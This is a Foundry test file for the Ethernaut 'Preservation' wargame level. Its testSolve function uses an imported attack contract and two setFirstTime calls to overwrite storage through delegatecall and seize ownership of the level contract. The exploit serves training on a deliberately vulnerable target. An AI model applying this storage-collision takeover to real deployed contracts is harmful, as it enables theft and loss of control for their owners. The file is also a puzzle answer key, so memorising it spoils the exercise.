// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Utils} from "test/utils/Utils.sol";

import {Preservation} from "src/levels/Preservation.sol";
import {PreservationFactory} from "src/levels/PreservationFactory.sol";
import {PreservationAttack} from "src/attacks/PreservationAttack.sol";
import {Level} from "src/levels/base/Level.sol";
import {Ethernaut} from "src/Ethernaut.sol";

contract TestPreservation is Test, Utils {
    Ethernaut ethernaut;
    Preservation instance;

    address payable owner;
    address payable player;

    /*//////////////////////////////////////////////////////////////
                                 HELPERS
    //////////////////////////////////////////////////////////////*/

    function setUp() public {
        address payable[] memory users = createUsers(2);

        owner = users[0];
        vm.label(owner, "Owner");

        player = users[1];
        vm.label(player, "Player");

        vm.startPrank(owner);
        ethernaut = getEthernautWithStatsProxy(owner);
        PreservationFactory factory = new PreservationFactory();
        ethernaut.registerLevel(Level(address(factory)));
        vm.stopPrank();

        vm.startPrank(player);
        instance = Preservation(payable(createLevelInstance(ethernaut, Level(address(factory)), 0)));
        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                                 TESTS
    //////////////////////////////////////////////////////////////*/

    /// @notice Check the intial state of the level and enviroment.
    function testInit() public {
        vm.startPrank(player);
        assertFalse(submitLevelInstance(ethernaut, address(instance)));
    }

    /// @notice Test the solution for the level.
    function testSolve() public {
        vm.startPrank(player);

        PreservationAttack attacker = new PreservationAttack();
        instance.setFirstTime(uint256(uint160(address(attacker))));
        instance.setFirstTime(uint256(uint160(address(player))));

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
}
